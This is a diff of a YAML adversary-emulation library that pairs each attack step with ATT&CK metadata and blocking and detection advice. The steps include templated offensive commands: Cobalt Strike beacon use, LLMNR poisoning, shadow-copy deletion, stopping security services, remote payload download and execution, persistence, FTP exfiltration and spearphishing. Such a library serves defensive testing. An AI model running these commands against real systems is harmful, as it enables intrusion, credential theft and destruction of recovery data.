@@ -4,8 +4,8 @@ Collection:
   controls:
   - SIEM
   - EDR
-  description: Use PowerShell to export a target user's Exchange mailbox to a file
-    then delete the export request. (Only works for Exchange on-premise)
+  description: Use Exchange PowerShell modules to export a target user's Exchange
+    mailbox to a file then delete the export request. (for Exchange on-premise only)
   detect:
   - Use Exchange audit logs to alert on anomalous ActiveSync changes to user mailbox(es)
   - Suspicious process execution is detected by EDR or other endpoint security tool,
@@ -35,7 +35,8 @@ Command and Control:
   - IPS
   - Firewall
   - SIEM
-  description: Establish and communicate over an HTTP C2 channel
+  description: Establish and communicate over an HTTP command and control (C2) channel
+    using Cobalt Strike configured with a custom Malleable C2 profile.
   detect:
   - Connections to known malicious domains/IPs are detected
   - Connections with suspicious characteristics (e.g. first seen in environment, low
@@ -58,8 +59,6 @@ Command and Control:
   name: HTTP C2 Channel (Custom Profile)
   platforms:
   - windows
-  - macos
-  - linux
 - block:
   - Connections to known malicious domains/IPs are blocked
   controls:
@@ -67,7 +66,8 @@ Command and Control:
   - IPS
   - Firewall
   - SIEM
-  description: Establish and communicate over an HTTPS C2 channel
+  description: Establish and communicate over an HTTPS command and control (C2) channel
+    using Cobalt Strike configured with a custom Malleable C2 profile.
   detect:
   - Connections to known malicious domains/IPs are detected
   - Connections with suspicious characteristics (e.g. first seen in environment, low
@@ -85,24 +85,26 @@ Command and Control:
     isv: 1
     tactic: TA0011
     tid: T1071.001
+    x_tools:
+    - Cobalt Strike
   name: HTTPS C2 Channel (Custom Profile)
   platforms:
   - windows
-  - macos
-  - linux
 - block:
   - Connections to known malicious domains/IPs are blocked
+  - Traffic containing signatues for known bad tools are blocked by network security
+    controls such as an ID/PS
   controls:
   - IDS
   - IPS
   - Firewall
   - SIEM
-  description: Download a tool from a public hosting location such as GitHub onto
-    the victim system
+  description: Download a known malicious tool from a public hosting location over
+    HTTP onto the victim system
   detect:
   - Connections to known malicious domains/IPs are detected
-  - Signatues for known bad tools are detected by network security controls such as
-    an ID/PS
+  - Traffic containing signatues for known bad tools are detected by network security
+    controls such as an ID/PS
   - Connections with suspicious characteristics (e.g. first seen in environment, low
     domain age, weak/unknown reputation, bad/unknown categorization) generate alerts
     in the SIEM or network security controls
@@ -127,12 +129,12 @@ Command and Control:
   - UEBA
   - ID/PS
   - Hardening
-  description: Establish and communicate over an SMB C2 channel on the internal network
+  description: Establish and communicate over a Cobalt Strike SMB C2 channel on the
+    internal network
   detect:
   - Anomalous SMB communications are detected by UEBA and/or the IDS
   guidance:
-  - (after SMB-beaconing target )
-  - beacon> link {{ target }}
+  - "(after establishing SMB beacon on target)\nbeacon> link {{ target }} \n"
   logs:
   - network
   - winevent:configured
@@ -156,7 +158,6 @@ Command and Control:
   - IDS
   - IPS
   - Firewall
-  - SIEM
   description: Establish connection to system using ScreenConnect (ConnectWise Control)
   detect:
   - Connections to known remote access service domains/IPs are detected
@@ -178,16 +179,17 @@ Credential Access:
   - Disable LLMNR/NTB-NS via registry/GPO configurations
   controls:
   - Hardening
-  description: Poison LLMNR/NBT-NS traffic using the PowerShell script Invoke-Inveigh
-    in a beacon
+  description: Poison LLMNR/NBT-NS traffic using the PowerShell script Inveigh in
+    a Cobalt Strike beacon. Inveigh can be used by a low-privilege user but its functionality
+    will be limited compared to when run as a high-privilege (local administrator)
+    user.
   detect:
   - null
   guidance:
   - beacon> powershell-import {{ inveigh_script_path }}
-  - beacon> powershell Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput Y -RunTime
-    10 -StartupChecks N
-  - (or) beacon> powerpick Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput
-    Y -RunTime 10 -StartupChecks N
+  - "beacon> powershell Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP N -ConsoleOutput Y -RunTime\
+    \ 10 -StartupChecks N\n(or) \nbeacon> powerpick Invoke-Inveigh -LLMNR Y -NBNS\
+    \ Y -HTTP N -ConsoleOutput Y -RunTime 10 -StartupChecks N\n"
   logs:
   - network
   metadata:
@@ -210,8 +212,8 @@ Credential Access:
   controls:
   - SIEM
   - UEBA
-  description: Perform a kerberoast attack by requesting Kerberos tickets for accounts
-    with service principal names
+  description: Perform a kerberoast attack by requesting Kerberos tickets for Active
+    Directory accounts with service principal names set
   detect:
   - Alert on a high volume of 4769 ticket request events from a single source
   - Configure a honey account with a service principal name set and alert on any ticket
@@ -267,7 +269,8 @@ Credential Access:
   controls:
   - EDR
   - SIEM
-  description: Extract credentials stored in browsers
+  description: Extract credentials stored in browsers using a compiled version of
+    LaZagne
   detect:
   - Suspicious process/file access is detected by EDR or other endpoint security tool
   - Credential dumping tools detected via specific module loads and/or suspicious
@@ -284,68 +287,20 @@ Credential Access:
     isv: 1
     tactic: TA0006
     tid: T1555.003
+    x_tool_links:
+    - https://github.com/AlessandroZ/lazagne
   name: Credential Dumping from Browser
   platforms:
   - windows
 Defense Evasion:
 - block:
-  - Remote access to the service control manager is blocked by DACLs
-  controls:
-  - EDR
-  - SIEM
-  - Hardening
-  description: Disable a service associated with a security tool running on the system
-  detect:
-  - Alert on the service stop event for services related to critical functions like
-    security tools using native Windows logs and/or endpoint security tool telemetry
-  - Suspicious process execution is detected by EDR or other endpoint security tool,
-    or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> sc \\{{ target }} stop {{ service }}
-  logs:
-  - winevent:configured
-  - edr:telemetry
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0005
-    tid: T1562.001
-  name: Disable Security Tool Service
-  prerequisites:
-  - logon_rights
-  - local_admin
-- block:
-  - Suspicious process execution is blocked by EDR or other endpoint security tool
-  controls:
-  - EDR
-  - SIEM
-  description: Obfuscate then execute suspicious commands
-  detect:
-  - Suspicious process execution is detected by EDR or other endpoint security tool,
-    or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> '{{ command }}'
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - MuddyWater
-    isv: 1
-    tactic: TA0005
-    tid: T1027
-  name: Execution using Obfuscated CMD Command
-  platforms:
-  - windows
-  - macos
-  - linux
-- block:
   - Suspicious behavior is blocked by EDR or other endpoint security tool
   controls:
   - EDR
-  description: Inject malicious DLL into a running instance of svchost.exe
+  description: Inject a malicious reflective DLL into a running instance of svchost.exe
+    using Cobalt Strike's "dllinject" command. Before running, first modify the Cobalt
+    Strike profile's process injection block to prioritize use of CreateRemoteThread
+    as the executor and VirtualAlloc as the allocator.
   detect:
   - Suspicious behavior is detected by EDR or other endpoint security tool
   guidance:
@@ -369,12 +324,12 @@ Defense Evasion:
   - Suspicious behavior is blocked by EDR or other endpoint security tool
   controls:
   - EDR
-  description: Launch a executable program that will load an encryted DLL from its
-    resource section into memory
+  description: Launch a exe payload that will load a DLL from its resource section
+    into memory
   detect:
   - Suspicious behavior is detected by EDR or other endpoint security tool
   guidance:
-  - '{{ binary_payload }}'
+  - '{{ exe_payload }}'
   logs:
   - edr:telemetry
   metadata:
@@ -388,12 +343,66 @@ Defense Evasion:
   platforms:
   - windows
 - block:
+  - Suspicious process execution is blocked by EDR or other endpoint security tool
+  controls:
+  - EDR
+  - SIEM
+  description: Execute obfuscated suspicious commands on an endpoint
+  detect:
+  - Suspicious process execution is detected by EDR or other endpoint security tool,
+    or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> '{{ command }}'
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - MuddyWater
+    isv: 1
+    tactic: TA0005
+    tid: T1027
+  name: Execution using Obfuscated CMD Command
+  platforms:
+  - windows
+  - macos
+  - linux
+- block:
+  - Remote access to the service control manager is blocked by DACLs
+  controls:
+  - EDR
+  - SIEM
+  - Hardening
+  description: Remotely disable a service associated with a security tool running
+    on a target system by using "sc.exe"
+  detect:
+  - Alert on the service stop event for services related to critical functions like
+    security tools using native Windows logs and/or endpoint security tool telemetry
+  - Suspicious process execution is detected by EDR or other endpoint security tool,
+    or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> sc \\{{ target }} stop {{ service }}
+  logs:
+  - winevent:configured
+  - edr:telemetry
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0005
+    tid: T1562.001
+  name: Disable Security Tool Service Remotely
+  prerequisites:
+  - logon_rights
+  - local_admin
+- block:
   - null
   controls:
   - SIEM
   - EDR
-  description: Block UDP ports 53 (DNS) and 137 (NetBIOS) on the Windows firewall
-    using netsh.exe.
+  description: Block outbound traffic to UDP ports 53 (DNS) and 137 (NetBIOS) on the
+    Windows firewall using netsh.exe.
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
@@ -423,8 +432,8 @@ Defense Evasion:
   controls:
   - SIEM
   - EDR
-  description: Disable advanced auditing features on the endpoint using the native
-    utility "auditpol.exe"
+  description: Disable Windows advanced auditing features on the endpoint using the
+    native utility "auditpol.exe"
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
@@ -447,6 +456,77 @@ Defense Evasion:
   prerequisites:
   - local_admin
 Discovery:
+- block:
+  - null
+  controls:
+  - SIEM
+  - EDR
+  description: Use nltest.exe commands to identify remote systems
+  detect:
+  - Suspicious process execution is detected by EDR or other endpoint security tool,
+    or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> nltest.exe /dclist:{{ domain }}
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0007
+    tid: T1018
+  name: Remote System Discovery - nltest
+  platforms:
+  - windows
+- block:
+  - null
+  controls:
+  - SIEM
+  - EDR
+  description: Identify all domain trust relationships using nltest
+  detect:
+  - Suspicious process execution is detected by EDR or other endpoint security tool,
+    or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> nltest.exe /domain_trusts /all_trusts
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0007
+    tid: T1482
+  name: Domain Trust Discovery with nltest
+  platforms:
+  - windows
+- block:
+  - null
+  controls:
+  - SIEM
+  - EDR
+  description: Identify domain trust relationships using the third-party utility ADFind.
+  detect:
+  - Suspicious process execution is detected by EDR or other endpoint security tool,
+    or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> adfind.exe -gcb -sc trustdmp > trusts.txt
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0007
+    tid: T1482
+    x_tool_links:
+    - http://www.joeware.net/freetools/tools/adfind/
+  name: Domain Trust Discovery with ADFind
+  platforms:
+  - windows
 - controls:
   - SIEM
   description: Use net.exe to list out shares for the system
@@ -467,12 +547,35 @@ Discovery:
   platforms:
   - windows
 - block:
+  - null
+  controls:
+  - EDR
+  - SIEM
+  description: Enumerated installed security tools on the local system using WMIC
+  detect:
+  - Suspicious process execution/behavior is detected by EDR or other endpoint security
+    tool, or alerted in SIEM based on process creation events
+  guidance:
+  - cmd> WMIC.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
+    Get displayName /Format:List
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    isv: 1
+    tactic: TA0007
+    tid: T1518.001
+  name: Security Tool Discovery
+  platforms:
+  - windows
+- block:
   - Suspicious process execution is blocked by EDR or other endpoint security tool
   controls:
   - EDR
   - UEBA
   - SIEM
-  description: Enumerate domain administrators using net.exe
+  description: Enumerate members of the domain administrators group using net.exe
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
@@ -546,100 +649,6 @@ Discovery:
   name: Enumerate Domain Information using Renamed adfind.exe
   platforms:
   - windows
-- block:
-  - null
-  controls:
-  - EDR
-  - SIEM
-  description: Enumerated installed security tools using WMIC
-  detect:
-  - Suspicious process execution/behavior is detected by EDR or other endpoint security
-    tool, or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> WMIC.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
-    Get displayName /Format:List
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    isv: 1
-    tactic: TA0007
-    tid: T1518.001
-  name: Security Tool Discovery
-  platforms:
-  - windows
-- block:
-  - null
-  controls:
-  - SIEM
-  - EDR
-  description: Identify domain trust relationships
-  detect:
-  - Suspicious process execution is detected by EDR or other endpoint security tool,
-    or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> nltest.exe /domain_trusts /all_trusts
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0007
-    tid: T1482
-  name: Domain Trust Discovery with nltest
-  platforms:
-  - windows
-- block:
-  - null
-  controls:
-  - SIEM
-  - EDR
-  description: Identify domain trust relationships
-  detect:
-  - Suspicious process execution is detected by EDR or other endpoint security tool,
-    or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> adfind.exe -gcb -sc trustdmp > trusts.txt
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0007
-    tid: T1482
-    x_tool_links:
-    - http://www.joeware.net/freetools/tools/adfind/
-  name: Domain Trust Discovery with ADFind
-  platforms:
-  - windows
-- block:
-  - null
-  controls:
-  - SIEM
-  - EDR
-  description: Use nltest.exe commands to identify remote systems
-  detect:
-  - Suspicious process execution is detected by EDR or other endpoint security tool,
-    or alerted in SIEM based on process creation events
-  guidance:
-  - cmd> nltest.exe /dclist:{{ domain }}
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0007
-    tid: T1018
-  name: Remote System Discovery - nltest
-  platforms:
-  - windows
 - controls:
   - SIEM
   - EDR
@@ -649,7 +658,7 @@ Discovery:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
   guidance:
-  - ps> Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid
+  - PS> Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid
     | ConvertTo-Csv -NoTypeInformation | % {$_ -replace '`n','_'} | Out-File C:\temp\1.xml
   logs:
   - process_create
@@ -681,8 +690,6 @@ Discovery:
   name: Process Discovery via Tasklist
   platforms:
   - windows
-  - macos
-  - linux
 - controls:
   - SIEM
   description: Use arp.exe to list recent connections
@@ -733,7 +740,7 @@ Execution:
   - EDR
   - SIEM
   - Antivirus
-  description: Establish an initial foothold using a malicious  Office macro
+  description: Establish an initial foothold using a malicious Office macro
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
@@ -757,15 +764,18 @@ Execution:
   controls:
   - Antivirus
   - EDR
-  description: Execute a DLL function directly using rundll32 as an encoded PowerShell
-    command
+  description: Execute a malicious DLL's function directly using rundll32 as an encoded
+    PowerShell command
   detect:
   - Suspicious process execution/behavior is detected by EDR or other endpoint security
     tool, or alerted in SIEM based on process creation events
   - Payload on disk triggers an alert in EDR or other endpoint security tool
   guidance:
-  - cmd> powershell -nop -exec bypass -encodedcommand {{ encoded_command }}
-  - encoded_command -> rundll32 {{ dll_payload }} {{ dll_export }}"
+  - 'cmd> powershell -nop -exec bypass -encodedcommand {{ encoded_command }}
+
+    encoded_command -> rundll32 {{ dll_payload }} {{ dll_export }}"
+
+    '
   logs:
   - edr:telemetry
   - process_create
@@ -785,8 +795,8 @@ Execution:
   - EDR
   - SIEM
   - Antivirus
-  description: Use a VBScript payload to download and execute an encoded PowerShell
-    script
+  description: Use a VBScript payload to download and execute a malicious PowerShell
+    one-liner
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool,
     or alerted in SIEM based on process creation events
@@ -801,6 +811,8 @@ Execution:
     isv: 1
     tactic: TA0002
     tid: T1059.005
+    x_tool_links:
+    - https://gist.github.com/2XXE-SRA/5a6cc2005a5ca4d014cd7fc1db15e797
   name: Execution using VBScript
   platforms:
   - windows
@@ -820,8 +832,9 @@ Exfiltration:
     domain age, weak/unknown reputation, bad/unknown categorization) generate alerts
     in the SIEM or network security controls
   guidance:
-  - ftp> | USER {{ user }} PASS {{ password }} OPTS utf8 on PWD TYPE I PASV STORE
-    {{ local_file }} {{ dest_name }} PASV STORE {{ local_file }} {{ dest_name }}
+  - "ftp> \nUSER {{ user }}\nPASS {{ password }}\nOPTS utf8 on\nPWD\nTYPE I\nPASV\n\
+    STORE {{ local_file }} {{ dest_name }}\nPASV\nSTORE {{ local_file }} {{ dest_name\
+    \ }}\n"
   logs:
   - network
   metadata:
@@ -845,8 +858,8 @@ Impact:
     '
   detect:
   - Suspicious process execution is detected by EDR or other endpoint security tool
-  - A large amount of file deletion and creations and/or file creations with known
-    ransomware extensions are alerted on in the SIEM
+  - A large amount of file deletion and/or file creations are alerted on in the SIEM
+    or file monitoring software
   guidance:
   - '{{ ransomware_binary }}'
   logs:
@@ -928,10 +941,15 @@ Impact:
   - Use Windows file system auditing capabilities to monitor access attempts for specific
     files and/or paths (e.g. paths related to Volume Shadow Services)
   guidance:
-  - cmd> vssadmin.exe delete shadows /all /quiet
-  - 'cmd> vssadmin resize shadowstorage /for={{ drive_letter }}: /on=c: /maxsize=401MB
+  - 'cmd> vssadmin.exe delete shadows /all /quiet
+
+    (or)
+
+    "cmd> vssadmin resize shadowstorage /for={{ drive_letter }}: /on=c: /maxsize=401MB
     && vssadmin resize shadowstorage /for={{ drive_letter }}: /on={{ drive_letter
-    }}: /maxsize=unbounded'
+    }}: /maxsize=unbounded"
+
+    '
   logs:
   - process_create
   - edr:telemetry
@@ -948,6 +966,51 @@ Impact:
   prerequisites:
   - local_admin
 Initial Access:
+- block:
+  - Malicious link blocked/quarantined by email gateway
+  controls:
+  - Mail Gateway
+  description: Send a spearphishing email to a target inbox that contains a link to
+    a malicious payload
+  detect:
+  - Malicious link alerted by email gateway
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ bodywithlink }} -To {{ target }} -From {{ from }}
+  logs:
+  - mail
+  metadata:
+    groups:
+    - Wizard Spider
+    - MuddyWater
+    isv: 1
+    tactic: TA0001
+    tid: T1566.002
+  name: Spearphishing Link - Macro
+- block:
+  - Malicious document blocked/quarantined by email gateway
+  controls:
+  - Mail Gateway
+  description: 'Send a link to a PDF payload that has a link to an exe hosted on Google
+    Drive to a target user.
+
+    '
+  detect:
+  - Malicious document alerted by email gateway
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments
+    {{ attachment }}
+  logs:
+  - mail
+  metadata:
+    groups:
+    - Wizard Spider
+    - MuddyWater
+    isv: 1
+    tactic: TA0001
+    tid: T1566.002
+  name: Spearphishing Link - PDF with Link (Google Drive)
 - block:
   - Malicious document blocked/quarantined by email gateway
   controls:
@@ -977,8 +1040,10 @@ Initial Access:
   - Malicious document blocked/quarantined by email gateway
   controls:
   - Mail Gateway
-  description: Send a spearphishing attachment containing a malicious macro payload
+  description: 'Send a spearphishing attachment containing a malicious macro payload
     to a target inbox
+
+    '
   detect:
   - Malicious document alerted by email gateway
   guidance:
@@ -996,51 +1061,6 @@ Initial Access:
     tactic: TA0001
     tid: T1566.001
   name: Spearphishing Attachment - Macro
-- block:
-  - Malicious link blocked/quarantined by email gateway
-  controls:
-  - Mail Gateway
-  description: Send a spearphishing email to a target inbox that contains a link to
-    a malicious payload
-  detect:
-  - Malicious link alerted by email gateway
-  guidance:
-  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
-    {{ subject }} -Body {{ bodywithlink }} -To {{ target }} -From {{ from }}
-  logs:
-  - mail
-  metadata:
-    groups:
-    - Wizard Spider
-    - MuddyWater
-    isv: 1
-    tactic: TA0001
-    tid: T1566.002
-  name: Spearphishing Link - Macro
-- block:
-  - Malicious document blocked/quarantined by email gateway
-  controls:
-  - Mail Gateway
-  description: 'Send a link to a PDF attachment payload that has a link to an exe
-    hosted on Google Drive to a target user.
-
-    '
-  detect:
-  - Malicious document alerted by email gateway
-  guidance:
-  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
-    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments
-    {{ attachment }}
-  logs:
-  - mail
-  metadata:
-    groups:
-    - Wizard Spider
-    - MuddyWater
-    isv: 1
-    tactic: TA0001
-    tid: T1566.002
-  name: Spearphishing Link - PDF with Link (Google Drive)
 Lateral Movement:
 - block:
   - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
@@ -1066,71 +1086,6 @@ Lateral Movement:
   - windows
   prerequisites:
   - local_admin
-- block:
-  - Suspicious process execution/behavior is blocked by EDR or other endpoint security
-    tool
-  - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
-  controls:
-  - EDR
-  - Antivirus
-  - UEBA
-  description: Using wmic.exe, execute a command on a remote system that will download
-    and execute an executable payload
-  detect:
-  - Suspicious process execution/behavior is detected by EDR or other endpoint security
-    tool, or alerted in SIEM based on process creation events
-  - Payload on disk triggers an alert in EDR or other endpoint security tool
-  - Logons with suspicious characteristics (e.g. first logon, anomalous logon time,
-    non-standard authentication package) generate alerts in the SIEM or UEBA
-  guidance:
-  - cmd> wmic.exe /node:"{{ target }}" process call create "cmd.exe /c bitsadmin /transfer
-    vVv \\{{ share_host }}\{{ share_name }}$\vVv.exe %APPDATA%\vVv.exe & %APPDATA%\vVv.exe"
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0008
-    tid: T1047
-  name: Lateral Movement via WMIC and Bitsadmin
-  platforms:
-  - windows
-  prerequisites:
-  - logon_rights
-- block:
-  - Suspicious process execution/behavior is blocked by EDR or other endpoint security
-    tool
-  - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
-  controls:
-  - EDR
-  - Antivirus
-  - UEBA
-  description: Move laterally to another system by using WMI and rundll32
-  detect:
-  - Suspicious process execution/behavior is detected by EDR or other endpoint security
-    tool, or alerted in SIEM based on process creation events
-  - Payload on disk triggers an alert in EDR or other endpoint security tool
-  - Logons with suspicious characteristics (e.g. first logon, anomalous logon time,
-    non-standard authentication package) generate alerts in the SIEM or UEBA
-  guidance:
-  - "cmd> wmic /node:\"{{ target }}\" process call create \u201Crundll32 {{ dll_payload\
-    \ }} {{ dll_export }}\""
-  logs:
-  - process_create
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0008
-    tid: T1047
-  name: Lateral Movement via WMIC and Rundll32
-  platforms:
-  - windows
-  prerequisites:
-  - logon_rights
 - block:
   - null
   controls:
@@ -1196,13 +1151,80 @@ Lateral Movement:
   controls:
   - EDR
   - Antivirus
-  description: Move laterally to another system by using WinRM and rundll32
+  - UEBA
+  description: Using wmic.exe, execute a command on a remote system that will download
+    and execute an executable payload hosted on a share.
+  detect:
+  - Suspicious process execution/behavior is detected by EDR or other endpoint security
+    tool, or alerted in SIEM based on process creation events
+  - Payload on disk triggers an alert in EDR or other endpoint security tool
+  - Logons with suspicious characteristics (e.g. first logon, anomalous logon time,
+    non-standard authentication package) generate alerts in the SIEM or UEBA
+  guidance:
+  - cmd> wmic.exe /node:"{{ target }}" process call create "cmd.exe /c bitsadmin /transfer
+    vVv \\{{ share_host }}\{{ share_name }}$\vVv.exe %APPDATA%\vVv.exe & %APPDATA%\vVv.exe"
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0008
+    tid: T1047
+  name: Lateral Movement via WMIC and Bitsadmin
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+- block:
+  - Suspicious process execution/behavior is blocked by EDR or other endpoint security
+    tool
+  - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
+  controls:
+  - EDR
+  - Antivirus
+  - UEBA
+  description: Move laterally to another system by using WMI to execute a DLL payload
+    using rundll32.
+  detect:
+  - Suspicious process execution/behavior is detected by EDR or other endpoint security
+    tool, or alerted in SIEM based on process creation events
+  - Payload on disk triggers an alert in EDR or other endpoint security tool
+  - Logons with suspicious characteristics (e.g. first logon, anomalous logon time,
+    non-standard authentication package) generate alerts in the SIEM or UEBA
+  guidance:
+  - "cmd> wmic /node:\"{{ target }}\" process call create \u201Crundll32 {{ dll_payload\
+    \ }} {{ dll_export }}\""
+  logs:
+  - process_create
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0008
+    tid: T1047
+  name: Lateral Movement via WMIC and Rundll32
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+- block:
+  - Suspicious process execution/behavior is blocked by EDR or other endpoint security
+    tool
+  - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
+  controls:
+  - EDR
+  - Antivirus
+  description: Move laterally to another system by using WinRM to execute a DLL payload
+    using rundll32.
   detect:
   - Suspicious process execution/behavior is detected by EDR or other endpoint security
     tool, or alerted in SIEM based on process creation events
   - Payload on disk triggers an alert in EDR or other endpoint security tool
   guidance:
-  - ps> Invoke-Command -ComputerName {{ target }} -ScriptBlock { rundll32 {{ dll_payload
+  - PS> Invoke-Command -ComputerName {{ target }} -ScriptBlock { rundll32 {{ dll_payload
     }} {{ dll_export }} }
   logs:
   - edr:telemetry
@@ -1224,8 +1246,8 @@ Persistence:
   controls:
   - EDR
   - SIEM
-  description: Persist on a system by creating an LNK to a payload then adding the
-    LNK to the userinit registry
+  description: Persist on a system by creating an LNK in the user's startup folder
+    that points an exe payload then adding the LNK to the userinit registry
   detect:
   - Detect suspicious registry key creation using Windows event id 4656 after configuring
     auditing on the Registry or specific paths or use EDR telemetry
@@ -1252,34 +1274,12 @@ Persistence:
   controls:
   - EDR
   - SIEM
-  description: Persist on a system by creating a new scheduled task
-  detect:
-  - Detect suspicious task creation using Windows event id 4698
-  guidance:
-  - cmd> schtasks.exe /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'"
-    /f /RL HIGHEST
-  logs:
-  - winevent:configured
-  metadata:
-    groups:
-    - Wizard Spider
-    - APT29
-    isv: 1
-    tactic: TA0003
-    tid: T1053.005
-  name: New Scheduled Task
-  platforms:
-  - windows
-- block:
-  - null
-  controls:
-  - EDR
-  - SIEM
   description: Persist on a system by creating a Registry run key that will trigger
-    on logon
+    on user logon
   detect:
   - Detect suspicious registry key creation using Windows event id 4656 after configuring
     auditing on the Registry or specific paths
+  - Detect known IOCs in registry key characteristics such as the name
   guidance:
   - cmd> reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backup
     Mgr" /t REG_SZ /f /d {{ command }}
@@ -1295,6 +1295,33 @@ Persistence:
   platforms:
   - windows
 - block:
+  - null
+  controls:
+  - EDR
+  - SIEM
+  description: Persist on a system by creating a new scheduled task
+  detect:
+  - Detect suspicious task creation using Windows event id 4698
+  - Detect known IOCs in scheduled task characteristics such as the task name and
+    command.
+  guidance:
+  - cmd> schtasks.exe /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'"
+    /f /RL HIGHEST
+  logs:
+  - winevent:configured
+  metadata:
+    groups:
+    - Wizard Spider
+    - APT29
+    isv: 1
+    tactic: TA0003
+    tid: T1053.005
+  name: New Scheduled Task
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+- block:
   - Payload on disk deleted/quarantined by antivirus or other endpoint security tool
   - Suspicious process execution is blocked by EDR or other endpoint security tool
   - Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
@@ -1303,8 +1330,8 @@ Persistence:
   - SIEM
   - EDR
   - Antivirus
-  description: Establish persistence on a target system by creating a WMI commandlineeventconsumer
-    event subscription that launches a dll with rundll32
+  description: Establish persistence on a target system by creating a WMI CommandlineEventConsumer
+    event subscription that launches a malicious dll payload with rundll32
   detect:
   - Payload on disk triggers an alert in EDR or other endpoint security tool
   - Suspicious process execution is detected by EDR or other endpoint security tool,
